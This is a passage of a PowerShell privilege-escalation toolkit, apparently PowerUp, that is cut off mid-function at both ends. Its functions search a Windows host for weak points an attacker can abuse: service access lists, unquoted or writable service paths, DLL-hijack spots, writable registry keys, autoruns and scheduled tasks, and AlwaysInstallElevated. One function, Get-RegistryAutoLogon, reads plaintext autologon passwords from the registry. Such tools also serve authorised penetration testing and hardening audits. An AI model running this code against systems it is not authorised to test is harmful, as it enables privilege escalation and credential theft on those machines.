            if ($PermissionSet -eq 'ChangeConfig') {
                $TargetPermission = 0x500c0002
            }
            elseif ($PermissionSet -eq 'Restart') {
                $TargetPermission = 0x30
                $CheckAllPermissionsInSet = $True # so we check all permissions && style
            }
        }
        $UserIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $CurrentUserSids = $UserIdentity.Groups | Select-Object -ExpandProperty Value
        $CurrentUserSids += $UserIdentity.User.Value
    }
    PROCESS {
        ForEach($TargetService in $Services) {
            if( $TargetService.Dacl -eq $null ) {
                Write-Verbose "Skipping: $($TargetService.Name) [No DACL]"
                continue
            }
            ForEach($ServiceDacl in $TargetService.Dacl) {
                if ($CurrentUserSids -contains $ServiceDacl.SecurityIdentifier) {
                    if ($CheckAllPermissionsInSet) {
                        if (($ServiceDacl.AccessMask -band $TargetPermission) -eq $TargetPermission) {
                            $TargetService
                        }
                    }
                    else {
                        if (($ServiceDacl.AceType -eq 'AccessAllowed') -and ($ServiceDacl.AccessMask -band $TargetPermission)) {
                            $TargetService
                        }
                    }
                }
            }
        }
    }
}
function Get-ServiceReg {
    [OutputType('PowerUp.Service')]
    [CmdletBinding()]
    param(
        [Switch]
        $IncludeDrivers
    )
    $StartupTypes = @{
        0 = 'On Boot'
        1 = 'System Controlled'
        2 = 'Autostart'
        3 = 'Manual'
        4 = 'Disabled'
        999 = 'unknown'
    }
    $DefaultSddl = 'D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CR;;;AU)'
    $DefaultSD =  New-Object Security.AccessControl.CommonSecurityDescriptor $false,$false,$DefaultSddl
    Get-ChildItem 'HKLM:\SYSTEM\CurrentControlSet\Services' | ForEach-Object {
        $ServiceName = $_.PSChildName
        $PathName = $_.GetValue("ImagePath")
        $Type = $_.GetValue("Type")
        $StartupType = if($_.GetValue("Start") -eq $null) { "999" } else { $_.GetValue("Start") }
        if( ($Type -band  0x3) -and (-not $IncludeDrivers) ){
            Write-Verbose "Skipping: $ServiceName [Driver]"
            return
        }
        $Service = New-Object PSObject
        $Service | Add-Member -MemberType NoteProperty -Name Name -Value $ServiceName
        $Service | Add-Member -MemberType NoteProperty -Name ServiceName -Value $ServiceName
        $Service | Add-Member -MemberType NoteProperty -Name DisplayName -Value $_.GetValue("DisplayName")
        $Service | Add-Member -MemberType NoteProperty -Name RequiredServices -Value  $_.GetValue("DependOnService")
        $Service | Add-Member -MemberType NoteProperty -Name StartType -Value $StartupTypes[$StartupType]
        $Service | Add-Member -MemberType NoteProperty -Name ObtainedBy -Value "Registry"
        $Service | Add-Member -MemberType NoteProperty -Name ObjectName -Value $_.GetValue("ObjectName")
        $Service | Add-Member -MemberType NoteProperty -Name PathName -Value $PathName
        try {
            $Key = $_.OpenSubKey("Security")
        } catch [System.Management.Automation.MethodException] {
            Write-Verbose "Failure obtaining Security key for $ServiceName [Access Denied]"
            $Service.PSObject.TypeNames.Insert(0, 'PowerUp.Service')
            return $Service
        }
        try {
            if( $Key -eq $null ) {
                $RawSecurityDescriptor = $DefaultSD
            } else {
                $Sec = $Key.GetValue("Security")
                $RawSecurityDescriptor = New-Object Security.AccessControl.CommonSecurityDescriptor $false,$false,$Sec,0
            }
            $Dacl = $RawSecurityDescriptor.DiscretionaryAcl | ForEach-Object {
                Add-Member -InputObject $_ -MemberType NoteProperty -Name AccessRights -Value ($_.AccessMask -as $ServiceAccessRights) -PassThru
            }
            $Service | Add-Member -MemberType NoteProperty -Name Dacl -Value  $Dacl
        } catch [System.Management.Automation.MethodException] {
            Write-Verbose "Failure parsing Security key for $ServiceName [Parsing Error]"
        } finally {
            $Service.PSObject.TypeNames.Insert(0, 'PowerUp.Service')
            $Service
        }
    }
}
function Get-ServiceApi {
    [OutputType('PowerUp.Service')]
    [CmdletBinding()]
    param()
    Add-Type -AssemblyName system.serviceprocess
    $GetServices = [ServiceProcess.ServiceController].GetMethod('GetServices', 'public, static', $null, [type[]]@(), $null)
    $GetServiceHandle = [ServiceProcess.ServiceController].GetMethod('GetServiceHandle', [Reflection.BindingFlags] 'Instance, NonPublic')
    $QueryConfig = 0x00001
    $ReadControl = 0x20000
    $GetServices.Invoke($null, $null) | ForEach-Object {
        $Service = New-Object PSObject
        $Service | Add-Member -MemberType NoteProperty -Name Name -Value $_.Name
        $Service | Add-Member -MemberType NoteProperty -Name ServiceName -Value $_.ServiceName
        $Service | Add-Member -MemberType NoteProperty -Name DisplayName -Value $_.DisplayName
        $Service | Add-Member -MemberType NoteProperty -Name RequiredServices -Value  $_.RequiredServices
        $Service | Add-Member -MemberType NoteProperty -Name StartType -Value  $_.StartType
        $Service | Add-Member -MemberType NoteProperty -Name ObtainedBy -Value  "API"
        try {
            $ServiceHandle = $GetServiceHandle.Invoke($_, @($QueryConfig))
            $RequestedSize = 0
            $Result = $Advapi32::QueryServiceConfig($ServiceHandle, [IntPtr]::Zero, 0,[Ref]$RequestedSize);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error();
            if( ($LastError -eq 122) -and ($RequestedSize -gt 0)) {
                [IntPtr]$Struct = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($RequestedSize)
                $Result = $Advapi32::QueryServiceConfig($ServiceHandle, $Struct, $RequestedSize, [Ref]$RequestedSize);
                if( $Result ) {
                    $ServiceInfo = $Struct -as $SERVICE_INFORMATION
                    $Service | Add-Member -MemberType NoteProperty -Name ObjectName -Value $ServiceInfo.lpServiceStartName
                    $Service | Add-Member -MemberType NoteProperty -Name PathName -Value $ServiceInfo.lpBinaryPathName
                }
            }
        } catch {
        } finally {
            $Null = $Advapi32::CloseServiceHandle($ServiceHandle)
        }
        try {
            $ServiceHandle = $GetServiceHandle.Invoke($_, @($ReadControl))
            $RequestedSize = $null
            $Result = $Advapi32::QueryServiceObjectSecurity($ServiceHandle, [Security.AccessControl.SecurityInfos]::DiscretionaryAcl, @(), 0, [Ref]$RequestedSize);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if(($LastError -eq 122) -and ($RequestedSize -gt 0)) {
                $BinarySecurityDescriptor = New-Object Byte[]($RequestedSize)
                $Result = $Advapi32::QueryServiceObjectSecurity($ServiceHandle, [Security.AccessControl.SecurityInfos]::DiscretionaryAcl, $BinarySecurityDescriptor, $BinarySecurityDescriptor.Count, [Ref] $RequestedSize);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                if( $Result ) {
                    $RawSecurityDescriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $BinarySecurityDescriptor, 0
                    $Dacl = $RawSecurityDescriptor.DiscretionaryAcl | ForEach-Object {
                        Add-Member -InputObject $_ -MemberType NoteProperty -Name AccessRights -Value ($_.AccessMask -as $ServiceAccessRights) -PassThru
                    }
                    $Service | Add-Member -MemberType NoteProperty -Name Dacl -Value  $Dacl
                }
            }
        } catch {
        } finally {
            $Null = $Advapi32::CloseServiceHandle($ServiceHandle)
        }
        $Service.PSObject.TypeNames.Insert(0, 'PowerUp.Service')
        $Service
    }
}
function Get-ServiceWmi {
    [OutputType('PowerUp.Service')]
    [CmdletBinding()]
    param()
    Add-Type -AssemblyName system.serviceprocess
    $GetServiceHandle = [ServiceProcess.ServiceController].GetMethod('GetServiceHandle', [Reflection.BindingFlags] 'Instance, NonPublic')
    $ReadControl = 0x20000
    Get-WmiObject -Class win32_service -ErrorAction SilentlyContinue | ForEach-Object {
        $Service = New-Object PSObject
        $Service | Add-Member -MemberType NoteProperty -Name Name -Value $_.Name
        $Service | Add-Member -MemberType NoteProperty -Name ServiceName -Value $_.Name
        $Service | Add-Member -MemberType NoteProperty -Name DisplayName -Value $_.DisplayName
        $Service | Add-Member -MemberType NoteProperty -Name RequiredServices -Value @()
        $Service | Add-Member -MemberType NoteProperty -Name StartType -Value  $_.StartMode
        $Service | Add-Member -MemberType NoteProperty -Name ObtainedBy -Value  "WMI"
        $Service | Add-Member -MemberType NoteProperty -Name ObjectName -Value $_.StartName
        $Service | Add-Member -MemberType NoteProperty -Name PathName -Value $_.PathName
        $s = Get-Service -Name $_.Name -ErrorAction SilentlyContinue
        try {
            $ServiceHandle = $GetServiceHandle.Invoke($s, @($ReadControl))
            $RequestedSize = $null
            $Result = $Advapi32::QueryServiceObjectSecurity($ServiceHandle, [Security.AccessControl.SecurityInfos]::DiscretionaryAcl, @(), 0, [Ref]$RequestedSize);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if(($LastError -eq 122) -and ($RequestedSize -gt 0)) {
                $BinarySecurityDescriptor = New-Object Byte[]($RequestedSize)
                $Result = $Advapi32::QueryServiceObjectSecurity($ServiceHandle, [Security.AccessControl.SecurityInfos]::DiscretionaryAcl, $BinarySecurityDescriptor, $BinarySecurityDescriptor.Count, [Ref] $RequestedSize);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                if( $Result ) {
                    $RawSecurityDescriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $BinarySecurityDescriptor, 0
                    $Dacl = $RawSecurityDescriptor.DiscretionaryAcl | ForEach-Object {
                        Add-Member -InputObject $_ -MemberType NoteProperty -Name AccessRights -Value ($_.AccessMask -as $ServiceAccessRights) -PassThru
                    }
                    $Service | Add-Member -MemberType NoteProperty -Name Dacl -Value  $Dacl
                }
            }
        } catch {
        } finally {
            $Null = $Advapi32::CloseServiceHandle($ServiceHandle)
        }
        $Service.PSObject.TypeNames.Insert(0, 'PowerUp.Service')
        $Service
    }
}
function Get-UnquotedService {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.Service')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
        [PSObject[]]
        $Services
    )
    BEGIN {
        $Regex = [regex]"^[^`"'].* .*\.exe"
    }
    PROCESS {
        ForEach($Service in $Services) {
            if( $Service.PathName -eq $Null ) {
                Write-Verbose "Skipping: $($Service.Name) [No Image Path]"
                continue
            }
            if( $Regex.Match($Service.PathName).Success ){
                $SplitPathArray = $Service.PathName.Trim().Split(' ')
                $ConcatPathArray = @()
                for ($i=1;$i -lt $SplitPathArray.Count; $i++) {
                            $ConcatPathArray += $SplitPathArray[0..$i] -join ' '
                }
                $count = 1
                $ModifiableFiles = $ConcatPathArray | Get-ModifiablePath
                $ModifiableFiles | Where-Object {$_ -and $_.ModifiablePath -and ($_.ModifiablePath -ne '') -and ($_.ModifiablePath -ne 'C:\')} | Foreach-Object {
                    $Service | Add-Member -MemberType NoteProperty -Name "ModifiablePath$count" -Value "`"$($_.ModifiablePath)`"" -Force
                    $count += 1
                }
                if( $count -gt 1 ) { 
                    $Service 
                }
            }
        }
    }
}
function Get-ModifiableServiceFile {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.Service')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
        [PSObject[]]
        $Services
    )
    PROCESS {
        ForEach( $Service in $Services ) {
            $ServiceName = $Service.Name
            $ServicePath = $Service.PathName
            if( $ServicePath -eq $null ) {
                Write-Verbose "Skipping: $ServiceName [No Image Path]"
                continue
            }
            $count = 1
            $ServicePath | Get-ModifiablePath | ForEach-Object {
                $Service | Add-Member -MemberType NoteProperty -Name "ModifiableFile$count" -Value "`"$($_.ModifiablePath)`"" -Force
                $count += 1
            }
            if( $count -gt 1 ) { 
                $Service.PSObject.TypeNames.Insert(0, 'PowerUp.Service')
                $Service 
            }
        }
    }
}
function Show-ServicePermissions {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.ServicePermission')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
        [PSObject[]]
        $Services,
        [Switch]
        $All
    )
    BEGIN {
        $UserIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $CurrentUserSids = $UserIdentity.Groups | Select-Object -ExpandProperty Value
        $CurrentUserSids += $UserIdentity.User.Value
        $TranslatedIdentityReferences = @{}
    }
    PROCESS {
        ForEach( $Service in $Services ) {
            if( $Service.Dacl -eq $Null ) {
                Write-Verbose "Skipping: $($Service.Name) [No Dacl Property]"
                continue
            }
            $Service | Select-Object -ExpandProperty Dacl | Where-Object { $_.AceType -match 'Allow' } | ForEach-Object {
                $Permissions = $_.AccessRights
                $Sid = $_.SecurityIdentifier   
                try {
                    $i = New-Object System.Security.Principal.SecurityIdentifier($Sid)
                    $Principal = $i.Translate([System.Security.Principal.NTAccount]).Value
                } catch {
                    $Principal = $Sid
                }
                if( ($CurrentUserSids -contains $Sid) -or $All ) {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'Service' $Service.Name
                    $Out | Add-Member Noteproperty 'Principal' $Principal
                    $Out | Add-Member Noteproperty 'ObjectName' $Service.ObjectName
                    $Out | Add-Member Noteproperty 'Permissions' $Permissions
                    $Out.PSObject.TypeNames.Insert(0, 'PowerUp.ServicePermission')
                    $Out
                }
            }
        }
    }
}
function Find-ProcessDLLHijack {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.HijackableDLL.Process')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ProcessName')]
        [String[]]
        $Name = $(Get-Process | Select-Object -Expand Name),
        [Switch]
        $ExcludeWindows,
        [Switch]
        $ExcludeProgramFiles,
        [Switch]
        $ExcludeOwned
    )
    BEGIN {
        $Keys = (Get-Item "HKLM:\System\CurrentControlSet\Control\Session Manager\KnownDLLs")
        $KnownDLLs = $(ForEach ($KeyName in $Keys.GetValueNames()) { $Keys.GetValue($KeyName).tolower() }) | Where-Object { $_.EndsWith(".dll") }
        $KnownDLLPaths = $(ForEach ($name in $Keys.GetValueNames()) { $Keys.GetValue($name).tolower() }) | Where-Object { -not $_.EndsWith(".dll") }
        $KnownDLLs += ForEach ($path in $KnownDLLPaths) { ls -force $path\*.dll | Select-Object -ExpandProperty Name | ForEach-Object { $_.tolower() }}
        $CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
        $Owners = @{}
        Get-WmiObject -Class win32_process | Where-Object {$_} | ForEach-Object { $Owners[$_.handle] = $_.getowner().user }
    }
    PROCESS {
        ForEach ($ProcessName in $Name) {
            $TargetProcess = Get-Process -Name $ProcessName
            if ($TargetProcess -and $TargetProcess.Path -and ($TargetProcess.Path -ne '') -and ($Null -ne $TargetProcess.Path)) {
                try {
                    $BasePath = $TargetProcess.Path | Split-Path -Parent
                    $LoadedModules = $TargetProcess.Modules
                    $ProcessOwner = $Owners[$TargetProcess.Id.ToString()]
                    ForEach ($Module in $LoadedModules){
                        $ModulePath = "$BasePath\$($Module.ModuleName)"
                        if ((-not $ModulePath.Contains('C:\Windows\System32')) -and (-not (Test-Path -Path $ModulePath)) -and ($KnownDLLs -NotContains $Module.ModuleName)) {
                            $Exclude = $False
                            if ($PSBoundParameters['ExcludeWindows'] -and $ModulePath.Contains('C:\Windows')) {
                                $Exclude = $True
                            }
                            if ($PSBoundParameters['ExcludeProgramFiles'] -and $ModulePath.Contains('C:\Program Files')) {
                                $Exclude = $True
                            }
                            if ($PSBoundParameters['ExcludeOwned'] -and $CurrentUser.Contains($ProcessOwner)) {
                                $Exclude = $True
                            }
                            if (-not $Exclude){
                                $Out = New-Object PSObject
                                $Out | Add-Member Noteproperty 'ProcessName' $TargetProcess.ProcessName
                                $Out | Add-Member Noteproperty 'ProcessPath' $TargetProcess.Path
                                $Out | Add-Member Noteproperty 'ProcessOwner' $ProcessOwner
                                $Out | Add-Member Noteproperty 'ProcessHijackableDLL' $ModulePath
                                $Out.PSObject.TypeNames.Insert(0, 'PowerUp.HijackableDLL.Process')
                                $Out
                            }
                        }
                    }
                }
                catch {
                    Write-Verbose "Error: $_"
                }
            }
        }
    }
}
function Find-PathDLLHijack {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.HijackableDLL.Path')]
    [CmdletBinding()]
    Param()
    Get-Item Env:Path | Select-Object -ExpandProperty Value | ForEach-Object { $_.split(';') } | Where-Object {$_ -and ($_ -ne '')} | ForEach-Object {
        $TargetPath = $_
        $ModifidablePaths = $TargetPath | Get-ModifiablePath -Literal | Where-Object {$_ -and ($Null -ne $_) -and ($Null -ne $_.ModifiablePath) -and ($_.ModifiablePath.Trim() -ne '')}
        ForEach ($ModifidablePath in $ModifidablePaths) {
            if ($Null -ne $ModifidablePath.ModifiablePath) {
                $ModifidablePath | Add-Member Noteproperty '%PATH%' $_
                $ModifidablePath | Add-Member Aliasproperty Name '%PATH%'
                $ModifidablePath.PSObject.TypeNames.Insert(0, 'PowerUp.HijackableDLL.Path')
                $ModifidablePath
            }
        }
    }
}
function Get-ModifiableReg {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.ModifiableReg')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('PSPath')]
        [Alias('Name')]
        [String[]]
        $Path
    )
    BEGIN {
        $AccessMask = @{
             [uint32]'0x80000000' = 'GenericRead'
             [uint32]'0x40000000' = 'GenericWrite'
             [uint32]'0x20000000' = 'GenericExecute'
             [uint32]'0x10000000' = 'GenericAll'
             [uint32]'0x02000000' = 'MaximumAllowed'
             [uint32]'0x00080000' = 'WriteOwner'
             [uint32]'0x00040000' = 'WriteDAC'
             [uint32]'0x00020000' = 'ReadPermissions'
             [uint32]'0x00010000' = 'Delete'
             [uint32]'0x00000020' = 'CreateLink'
             [uint32]'0x00000010' = 'Notify'
             [uint32]'0x00000008' = 'EnumerateSubKeys'
             [uint32]'0x00000004' = 'CreateSubKey'
             [uint32]'0x00000002' = 'SetValue'
             [uint32]'0x00000001' = 'QueryValues'
        }
        $MAccessMask = 0x520d0006
        $UserIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $CurrentUserSids = $UserIdentity.Groups | Select-Object -ExpandProperty Value
        $CurrentUserSids += $UserIdentity.User.Value
        $TranslatedIdentityReferences = @{}
    }
    PROCESS {
        ForEach($TargetPath in $Path) {
            $CandidatePath = $TargetPath
            if( -not $CandidatePath.StartsWith("Microsoft") ) {
                $CandidatePath = "Microsoft.PowerShell.Core\Registry::$($CandidatePath.replace(':',''))"
            }
            if (-not (Test-Path -Path $CandidatePath -ErrorAction SilentlyContinue) ) {
                $ParentPath = Split-Path -Path $CandidatePath -Parent  -ErrorAction SilentlyContinue
                if (-not ($ParentPath -and (Test-Path -Path $ParentPath)) ) {
                    Write-Verbose "Skipping: $CandidatePath [Not Found]"
                    continue
                } else {
                    $CandidatePath = $ParentPath
                }
            }
            try {
                $Key = Get-Item -LiteralPath $CandidatePath -ErrorAction Stop
                $Acl = $Key.GetAccessControl()
                $Owner = $Acl.Owner;
                if( $Owner -notmatch '^S-1-5.*' ) {
                    if( -not $TranslatedIdentityReferences[$Owner] ) {
                        $IdentityUser = New-Object System.Security.Principal.NTAccount($Owner)
                        $TranslatedIdentityReferences[$Owner] = $IdentityUser.Translate([System.Security.Principal.SecurityIdentifier]) | Select-Object -ExpandProperty Value
                    }
                    $IdentitySID = $TranslatedIdentityReferences[$Owner]
                } else {
                    $IdentitySID = $Owner
                }
                if( $CurrentUserSids -contains $IdentitySID ) {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'ModifiablePath' $CandidatePath
                    $out | Add-Member Noteproperty 'Owner' $Owner
                    $Out | Add-Member Noteproperty 'IdentityReference' $Owner
                    $Out | Add-Member Noteproperty 'Permissions' @('Owner')
                    $Out.PSObject.TypeNames.Insert(0, 'PowerUp.ModifiablePath')
                    $Out
                }
            } catch [System.UnauthorizedAccessException] {
                Write-Verbose "Skipping: $CandidatePath [Access Denied]"
                continue
            }
            $Acl | Select-Object -ExpandProperty Access | Where-Object {($_.AccessControlType -match 'Allow')} | ForEach-Object {
                $RegistryRights = $_.RegistryRights.value__
                if( $RegistryRights -band $MAccessMask )  {
                    $Permissions = $AccessMask.Keys | Where-Object { $RegistryRights -band $_ } | ForEach-Object { $AccessMask[$_] }
                    $IdentityRef = $_.IdentityReference
                    if ($IdentityRef -notmatch '^S-1-5.*') {
                        if (-not ($TranslatedIdentityReferences[$IdentityRef])) {
                            $IdentityUser = New-Object System.Security.Principal.NTAccount($IdentityRef)
                            try {
                                $TranslatedIdentityReferences[$IdentityRef] = $IdentityUser.Translate([System.Security.Principal.SecurityIdentifier]) | Select-Object -ExpandProperty Value
                            } catch {
                                $TranslatedIdentityReferences[$IdentityRef] = $IdentityUser
                            }
                        }
                        $IdentitySID = $TranslatedIdentityReferences[$_.IdentityReference]
                    }
                    else {
                        $IdentitySID = $_.IdentityReference
                    }
                    if ($CurrentUserSids -contains $IdentitySID) {
                        $Out = New-Object PSObject
                        $Out | Add-Member Noteproperty 'ModifiablePath' $CandidatePath
                        $out | Add-Member Noteproperty 'Owner' $Owner
                        $Out | Add-Member Noteproperty 'IdentityReference' $_.IdentityReference
                        $Out | Add-Member Noteproperty 'Permissions' $Permissions
                        $Out.PSObject.TypeNames.Insert(0, 'PowerUp.ModifiableReg')
                        $Out
                    }
                }
            }
        }
    }
}
function Get-ModifiableRegistryService {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.ModifiableReg')]
    [CmdletBinding()]
    Param()
    Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\Services -Recurse -ErrorAction SilentlyContinue | Get-ModifiableReg
}
function Get-RegistryAlwaysInstallElevated {
    [OutputType('System.Boolean')]
    [CmdletBinding()]
    Param()
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = 'SilentlyContinue'
    if (Test-Path 'HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer') {
        $HKLMval = (Get-ItemProperty -Path 'HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated -ErrorAction SilentlyContinue)
        Write-Verbose "HKLMval: $($HKLMval.AlwaysInstallElevated)"
        if ($HKLMval.AlwaysInstallElevated -and ($HKLMval.AlwaysInstallElevated -ne 0)){
            $HKCUval = (Get-ItemProperty -Path 'HKCU:SOFTWARE\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated -ErrorAction SilentlyContinue)
            Write-Verbose "HKCUval: $($HKCUval.AlwaysInstallElevated)"
            if ($HKCUval.AlwaysInstallElevated -and ($HKCUval.AlwaysInstallElevated -ne 0)){
                Write-Verbose 'AlwaysInstallElevated enabled on this machine!'
                $True
            }
            else{
                Write-Verbose 'AlwaysInstallElevated not enabled on this machine.'
                $False
            }
        }
        else{
            Write-Verbose 'AlwaysInstallElevated not enabled on this machine.'
            $False
        }
    }
    else{
        Write-Verbose 'HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer does not exist'
        $False
    }
    $ErrorActionPreference = $OrigError
}
function Get-RegistryAutoLogon {
    [OutputType('PowerUp.RegistryAutoLogon')]
    [CmdletBinding()]
    Param()
    $AutoAdminLogon = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AutoAdminLogon -ErrorAction SilentlyContinue)
    Write-Verbose "AutoAdminLogon key: $($AutoAdminLogon.AutoAdminLogon)"
    if ($AutoAdminLogon -and ($AutoAdminLogon.AutoAdminLogon -ne 0)) {
        $DefaultDomainName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultDomainName -ErrorAction SilentlyContinue).DefaultDomainName
        $DefaultUserName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultUserName -ErrorAction SilentlyContinue).DefaultUserName
        $DefaultPassword = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultPassword -ErrorAction SilentlyContinue).DefaultPassword
        $AltDefaultDomainName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultDomainName -ErrorAction SilentlyContinue).AltDefaultDomainName
        $AltDefaultUserName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultUserName -ErrorAction SilentlyContinue).AltDefaultUserName
        $AltDefaultPassword = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultPassword -ErrorAction SilentlyContinue).AltDefaultPassword
        if ($DefaultUserName -or $AltDefaultUserName) {
            $Out = New-Object PSObject
            $Out | Add-Member Noteproperty 'DefaultDomainName' $DefaultDomainName
            $Out | Add-Member Noteproperty 'DefaultUserName' $DefaultUserName
            $Out | Add-Member Noteproperty 'DefaultPassword' $DefaultPassword
            $Out | Add-Member Noteproperty 'AltDefaultDomainName' $AltDefaultDomainName
            $Out | Add-Member Noteproperty 'AltDefaultUserName' $AltDefaultUserName
            $Out | Add-Member Noteproperty 'AltDefaultPassword' $AltDefaultPassword
            $Out.PSObject.TypeNames.Insert(0, 'PowerUp.RegistryAutoLogon')
            $Out
        }
    }
}
function Get-ModifiableRegistryAutoRun {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.ModifiableRegistryAutoRun')]
    [CmdletBinding()]
    Param()
    $SearchLocations = @(   "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                            "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
                            "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run",
                            "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce",
                            "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunService",
                            "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceService",
                            "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunService",
                            "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceService"
                        )
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"
    $SearchLocations | Where-Object { Test-Path $_ } | ForEach-Object {
        $Keys = Get-Item -Path $_
        $ParentPath = $_
        ForEach ($Name in $Keys.GetValueNames()) {
            $Path = $($Keys.GetValue($Name))
            $Path | Get-ModifiablePath | ForEach-Object {
                $Out = New-Object PSObject
                $Out | Add-Member Noteproperty 'Key' "$ParentPath\$Name"
                $Out | Add-Member Noteproperty 'Path' $Path
                $Out | Add-Member Noteproperty 'ModifiableFile' $_
                $Out | Add-Member Aliasproperty Name Key
                $Out.PSObject.TypeNames.Insert(0, 'PowerUp.ModifiableRegistryAutoRun')
                $Out
            }
        }
    }
    $ErrorActionPreference = $OrigError
}
function Get-ModifiableScheduledTaskFile {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.ModifiableScheduledTaskFile')]
    [CmdletBinding()]
    Param()
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"
    $Path = "$($ENV:windir)\System32\Tasks"
    Get-ChildItem -Path $Path -Recurse | Where-Object { -not $_.PSIsContainer } | ForEach-Object {
        try {
            $TaskName = $_.Name
            $TaskXML = [xml] (Get-Content $_.FullName)
            if ($TaskXML.Task.Triggers) {
                $TaskTrigger = $TaskXML.Task.Triggers.OuterXML
                $TaskXML.Task.Actions.Exec.Command | Get-ModifiablePath | ForEach-Object {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'TaskName' $TaskName
                    $Out | Add-Member Noteproperty 'TaskFilePath' $_
                    $Out | Add-Member Noteproperty 'TaskTrigger' $TaskTrigger
                    $Out | Add-Member Aliasproperty Name TaskName
                    $Out.PSObject.TypeNames.Insert(0, 'PowerUp.ModifiableScheduledTaskFile')
                    $Out
                }
                $TaskXML.Task.Actions.Exec.Arguments | Get-ModifiablePath | ForEach-Object {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'TaskName' $TaskName
                    $Out | Add-Member Noteproperty 'TaskFilePath' $_
                    $Out | Add-Member Noteproperty 'TaskTrigger' $TaskTrigger
                    $Out | Add-Member Aliasproperty Name TaskName
                    $Out.PSObject.TypeNames.Insert(0, 'PowerUp.ModifiableScheduledTaskFile')
                    $Out
                }
            }
        }
        catch {
            Write-Verbose "Error: $_"
        }
    }
    $ErrorActionPreference = $OrigError
}
function Get-ScheduledTasks {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.ScheduledTask')]
    [CmdletBinding()]
    Param()
    $TmpFile = New-TemporaryFile
    try {
        schtasks.exe /query /fo CSV /v > $TmpFile
        $Tasks = Import-Csv $TmpFile
    } catch {
        Write-Verbose "Error enumerating scheduled tasks using schtasks.exe"
        Write-Verbose $_
        return
    }
    ForEach($Task in $Tasks) {
        if( $Task.Taskname -eq "TaskName" ) {
            continue;
        }
        $Task.PSObject.TypeNames.Insert(0, 'PowerUp.ScheduledTask')
        $Task
    }
}
function Get-ModifiableScheduledTaskFile2 {
